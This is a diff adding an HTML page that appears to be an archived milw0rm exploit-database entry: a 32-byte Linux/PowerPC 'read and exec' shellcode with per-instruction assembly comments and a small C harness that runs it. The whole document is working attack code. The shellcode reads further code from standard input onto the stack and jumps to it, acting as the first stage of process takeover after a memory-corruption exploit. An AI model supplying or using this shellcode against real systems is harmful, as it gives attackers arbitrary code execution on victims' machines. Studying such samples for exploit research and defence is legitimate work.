@@ -1,0 +1,21 @@
+<html><head><title>linux/ppc read & exec shellcode 32 bytes</title></head><pre>/* readnexecppc-core.c by Charles Stevenson &lt;core@bokeoa.com&gt; */
+char hellcode[] = /* read(0,stack,1028); stack(); linux/ppc by core */
+&quot;\x7c\x63\x1a\x79&quot;     /* xor.    r3,r3,r3 */
+&quot;\x38\xa0\x04\x04&quot;     /* li      r5,1028 */
+&quot;\x30\x05\xfb\xff&quot;     /* addic   r0,r5,-1025 */
+&quot;\x7c\x24\x0b\x78&quot;     /* mr      r4,r1 */
+&quot;\x44\xde\xad\xf2&quot;     /* sc */
+&quot;\x69\x69\x69\x69&quot;     /* nop */
+&quot;\x7c\x29\x03\xa6&quot;     /* mtctr   r1 */
+&quot;\x4e\x80\x04\x21&quot;;    /* bctrl */
+
+int main(void)
+{
+  void (*shell)() = (void *)&amp;hellcode;
+  printf(&quot;%d byte read &amp; exec shellcode for linux/ppc by core\n&quot;,
+         strlen(hellcode));
+  shell();
+  return 0;
+}
+
+// milw0rm.com [2005-11-09]</pre></html>
